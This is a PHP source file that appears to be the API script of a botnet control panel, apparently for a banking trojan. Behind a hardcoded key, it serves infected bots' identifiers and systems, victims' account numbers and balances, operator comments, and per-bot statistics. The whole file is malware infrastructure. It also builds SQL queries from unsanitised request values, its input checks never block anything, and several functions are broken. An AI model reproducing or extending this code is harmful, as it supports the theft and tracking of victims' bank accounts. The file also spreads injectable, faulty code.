<?php

error_reporting(-1);

$dir = str_replace('/scripts/set', '', str_replace('\\', '/', realpath('.'))) . '/';

/*
$config = file_exists($dir . 'cache/config.json') ? json_decode(file_get_contents($dir . 'cache/config.json'), 1) : '';
if($config['scramb'] == 1 && $gateway != true){
	header("HTTP/1.1 404 Not Found");
	header("Status: 404 Not Found");
	print(file_get_contents($dir . '404.html'));
	exit;
}
*/
include_once($dir . 'includes/functions.first.php');

if(empty($_GET['key'])){
	print to_xml('false');
}else{
	if($_GET['key'] != 'm4bYm6RwhJl8tXjE'){
		print to_xml('false');
		exit;
	}
}

if(!empty($_GET['uid'])){
	$matches = explode('0', $_GET['uid'], 2);
	if(!empty($matches[0]) && !empty($matches[1])){
		$prefix = $matches[0];
		$uid = '0' . $matches[1];
	}
}

function to_xml($str){
	$xml = '<?xml version="1.0" encoding="UTF-8"?>' . "\r\n";
	$xml .= '<api>' . "\r\n";
	$xml .= '<return>'.$str.'</return>' . "\r\n";
	$xml .= '</api>' . "\r\n";
	return $xml;
}

function get_stat($bot){
	global $dir;
	if(file_exists($dir . 'cache/stat/' . $bot->system . '_' . $bot->prefix . $bot->uid)){
		return file_get_contents($dir . 'cache/kls/' . $bot->system . '_' . $bot->prefix . $bot->uid);
	}else{
		return 0;
	}
}

$prefix = strtoupper($prefix);
$uid = strtoupper($uid);

if(!empty($_GET['cid'])) $userid = $_GET['cid'];
if(empty($userid)){
	if(file_exists($dir . 'cache/clients.json')){
		$clients = @json_decode(@file_get_contents($dir . 'cache/clients.json'), true);
		if(is_array($clients) && $clients[$prefix]){
			$userid = $clients[$prefix];
		}
	}
}

include_once($dir . 'includes/functions.get_config.php');

error_reporting(0);

if(!empty($prefix) && !empty($uid) && !empty($_GET['mode'])){
	$cfg_db = get_config();
	
	require_once($dir . 'classes/mysqli.class.lite.php');
	$mysqli = new mysqli_db();
	
	$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
	unset($cfg_db);
	if(count($mysqli->errors) > 0) print_data('DB_ERROR!', true);

	switch($_GET['mode']){
		case 'status':
			print to_xml('AZADM_IS_OK!');
		break;
		
		case 'get_sys':
			$bot = $mysqli->query('SELECT system FROM bf_bots WHERE (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\')', null, null, false);
                        if(count($bot) > 0){
				print('<?xml version="1.0" encoding="UTF-8"?>' . "\r\n");
				print('<systems uid="'.$prefix.$uid.'">' . "\r\n");
				foreach($bot as $item){
					print("\t" . '<system>'.$item->system.'</system>' . "\r\n");
				}
				print('</systems>' . "\r\n");
			}else{
				print to_xml('false');
			}
		break;
	
		case 'get_systems':
			$bot = $mysqli->query('SELECT system FROM bf_bots WHERE (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\')', null, null, false);
                        if(count($sys) > 0){
				print('<?xml version="1.0" encoding="UTF-8"?>' . "\r\n");
				print('<systems>' . "\r\n");
				foreach($sys as $item){
					print("\t" . '<system nid="'.$item->nid.'">'.$item->name.'</system>' . "\r\n");
				}
                            print('</systems>' . "\r\n");
                        }else{
				print to_xml('false');
			}
		break;
	
		case 'get_uid_balance':
			if(!isset($_GET['sys']) && !preg_match('~^([a-zA-Z]+)$~is', $_GET['sys'])) print to_xml('false');
			$bot = $mysqli->query('SELECT acc, balance, post_date FROM bf_balance WHERE (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') AND (uid = \''.$uid.'\') AND (system = \''.$_GET['sys'].'\') ORDER by id DESC', null, null, false);

                        if(count($bot) > 0){
				print('<?xml version="1.0" encoding="UTF-8"?>' . "\r\n");
				print('<balances>' . "\r\n");
				foreach($bot as $item){
					print('<balanceentry>' . "\r\n");
					foreach($item as $key => $data){
						print('<'.$key.'>'.$data.'</'.$key.'>' . "\r\n");
					}
					print('</balanceentry>' . "\r\n");
				}
				print('</balances>' . "\r\n");
                        }else{
				print to_xml('false');
			}
		break;
		
                case 'set_comment':			
			if(!isset($_GET['sys']) && !preg_match('~^([a-zA-Z]+)$~is', $_GET['sys'])) print to_xml('false');
			
                        if(!empty($_GET['sys'])){
                            $bot = $mysqli->query('SELECT prefix, uid, system FROM bf_bots WHERE (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') AND (system = \''.$_GET['sys'].'\') LIMIT 1');

			    if(is_object($bot)){
				$bot->prefix = strtoupper($bot->prefix);
				$bot->uid = strtoupper($bot->uid);
			    }
			    
                            if(is_object($bot) && $bot->prefix == $prefix && $bot->uid == $uid && $bot->system == $_GET['sys']){
                                $comment = $mysqli->query('SELECT id, prefix, uid, type, post_date FROM bf_comments WHERE (prefix = \''.$bot->prefix.'\') AND (uid = \''.$bot->uid.'\') AND (type = \''.$bot->system.'\') LIMIT 1');
				
				if(empty($_POST['text'])){
					$_POST['text'] = '';
				}else{
					$_POST['text'] = str_replace("'", '', $_POST['text']);
					$_POST['text'] = str_replace("\r\n", '<br />', $_POST['text']);
				}
								
                                if($comment->prefix == $bot->prefix && $comment->uid == $bot->uid && $comment->type == $bot->system){
				    $ret = $mysqli->query("update bf_comments set comment = '".$_POST['text']."' WHERE (id='".$comment->id."') LIMIT 1");
				}else{
                                    $ret = $mysqli->query("INSERT INTO bf_comments (userid, prefix, uid, comment, type, post_id) VALUES ('".$userid."', '".$bot->prefix."', '".$bot->uid."', '".$_POST['text']."', '".$bot->system."', '0')");
                                }
				
				if($ret != false){
					print to_xml('true');
				}else{
					print to_xml('false');
				}
                            }else{
				print to_xml('false');
			    }
                        }else{
				print to_xml('false');
			}
		break;
                
                case 'get_comment':
			if(!isset($_GET['sys']) && !preg_match('~^([a-zA-Z]+)$~is', $_GET['sys'])) print to_xml('false');
			
			$bot = $mysqli->query('SELECT prefix, uid, system FROM bf_bots WHERE (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') AND (system = \''.$_GET['sys'].'\') LIMIT 1');
			
			if(is_object($bot) && $bot->prefix == $prefix && $bot->uid == $uid && $bot->system == $_GET['sys']){
				$comment = $mysqli->query('SELECT id, prefix, uid, comment, type, post_date FROM bf_comments WHERE (prefix = \''.$bot->prefix.'\') AND (uid = \''.$bot->uid.'\') AND (type = \''.$bot->system.'\') LIMIT 1');
				
				if(is_object($comment)){
					$comment->prefix = strtoupper($comment->prefix);
					$comment->uid = strtoupper($comment->uid);
					
					if($comment->prefix == $bot->prefix && $comment->uid == $bot->uid && $comment->type == $bot->system){
						$comment->comment= str_replace('<br />', "\r\n", $comment->comment);
						print to_xml($comment->comment);
					}else{
						print to_xml('false');
					}
				}else{
					print to_xml('false');
				}
			}else{
                            print to_xml('false');
                        }
		break;
	
		case 'stat_info':
			if(!isset($_GET['sys']) && !preg_match('~^([a-zA-Z]+)$~is', $_GET['sys'])) print to_xml('false');
			$bot = $mysqli->query('SELECT id,prefix, uid, system, post_date FROM bf_bots WHERE (system = \''.$_GET['sys'].'\')', null, null, false);
			
			if(is_array($bot) && count($bot) > 0){
				print('<?xml version="1.0" encoding="UTF-8"?>' . "\r\n");
				print('<bots>' . "\r\n");
				
				foreach($bot as $kld){
					print("\t" . '<bot uid="'.$kld->prefix.$kld->uid.'" id="'.$kld->id.'" system="'.$kld->system.'"  post_date="'.$kld->post_date.'" stat="'.get_stat($kld).'" />' . "\r\n");
				}
				
				print('</bots>' . "\r\n");
			}
		break;
	}
}

?>